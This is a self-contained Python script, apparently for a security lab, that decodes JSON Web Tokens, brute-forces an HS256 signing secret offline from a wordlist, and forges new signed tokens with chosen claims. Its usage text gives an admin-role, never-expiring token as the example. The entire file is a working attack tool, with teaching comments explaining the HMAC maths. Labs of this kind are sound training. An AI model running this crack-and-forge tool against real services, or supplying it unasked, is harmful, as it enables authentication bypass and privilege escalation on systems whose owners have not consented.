#!/usr/bin/env python3
"""Standalone JWT secret-cracker + forger for Day 4 -- no PyJWT, no
third-party dependencies. A compact JWT is just header.payload.signature,
all base64url, where -- for the HS256 algorithm this lab's target uses --
signature = HMAC-SHA256(secret, header_b64 + "." + payload_b64). This
script does exactly that math and nothing more, so what a "guessable
secret" attack actually is stays fully inspectable, not a tool black box.

Usage:
  python3 jwt_forge.py decode <token>
      Pretty-print a token's header and payload. No signature check --
      this is exactly what "anyone can READ a JWT's claims without the
      secret" means; only VERIFYING or FORGING one needs the secret.

  python3 jwt_forge.py crack <token> <wordlist>
      Try every non-empty line of <wordlist> as the HMAC secret; print
      the first one whose recomputed signature matches the token's own
      signature. This is an OFFLINE attack -- no network round-trip per
      guess, unlike hydra against /login -- so it's fast even with a
      short list.

  python3 jwt_forge.py forge <secret> <claims-json>
      Sign a NEW token containing <claims-json> (e.g.
      '{"sub":"admin","role":"admin","exp":9999999999}') with <secret>
      and print the resulting compact JWT on stdout.
"""
import base64
import hashlib
import hmac
import json
import sys


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def sign(header_b64: str, payload_b64: str, secret: str) -> bytes:
    signing_input = f"{header_b64}.{payload_b64}".encode()
    return hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()


def cmd_decode(token: str) -> None:
    header_b64, payload_b64, _sig_b64 = token.split(".")
    print("header: ", json.loads(b64url_decode(header_b64)))
    print("payload:", json.loads(b64url_decode(payload_b64)))


def cmd_crack(token: str, wordlist_path: str) -> None:
    header_b64, payload_b64, sig_b64 = token.split(".")
    target_sig = b64url_decode(sig_b64)
    with open(wordlist_path) as f:
        for line in f:
            candidate = line.strip()
            if not candidate:
                continue
            if hmac.compare_digest(sign(header_b64, payload_b64, candidate), target_sig):
                print(f"SECRET FOUND: {candidate}")
                return
    print("no candidate in wordlist matched")
    sys.exit(1)


def cmd_forge(secret: str, claims_json: str) -> None:
    # Validate it's actually JSON before signing garbage.
    json.loads(claims_json)
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(claims_json.encode())
    sig = sign(header_b64, payload_b64, secret)
    print(f"{header_b64}.{payload_b64}.{b64url(sig)}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    cmd, args = sys.argv[1], sys.argv[2:]
    try:
        if cmd == "decode":
            cmd_decode(*args)
        elif cmd == "crack":
            cmd_crack(*args)
        elif cmd == "forge":
            cmd_forge(*args)
        else:
            print(__doc__)
            sys.exit(1)
    except TypeError:
        print(__doc__)
        sys.exit(1)
